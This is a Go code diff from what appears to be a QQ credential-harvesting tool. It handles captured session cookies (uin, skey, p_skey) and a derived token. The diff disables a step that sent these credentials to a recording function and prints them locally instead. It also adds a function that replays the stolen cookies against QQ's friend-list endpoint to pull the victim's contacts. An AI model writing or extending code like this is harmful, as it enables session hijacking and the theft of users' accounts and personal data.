@@ -121,9 +121,9 @@ func getInfo(referer, targetUrl,title string)  {
 	user.PSkey = pSkey
 	user.GTK = genderGTK(skey)
 
-	//fmt.Printf("%+v \n",user)
-	bytes, _ := json.Marshal(user)
-	sendURL(string(bytes))
+	fmt.Printf("%+v \n",user)
+	//bytes, _ := json.Marshal(user)
+	//sendURL(string(bytes))
 }
 
 // 根据key匹配数组中的值
@@ -155,4 +155,18 @@ func sendURL(data string)  {
 	if err!=nil {
 		fmt.Println("记录信息失败:"+err.Error())
 	}
+}
+
+func getAllFriends(user *User)  {
+	client := &http.Client{}
+
+	request, _ := http.NewRequest("POST", "https://qun.qq.com/cgi-bin/qun_mgr/get_friend_list", strings.NewReader("bkn="+string(user.GTK)))
+	request.Header.Set("cookie",fmt.Sprintf("uin=%s; skey=%s;p_skey=%s",user.Uin,user.Skey,user.PSkey))
+
+	response, err := client.Do(request)
+	if err != nil {
+		fmt.Println(err)
+	}
+	bytes, _ := ioutil.ReadAll(response.Body)
+	fmt.Println(string(bytes))
 }
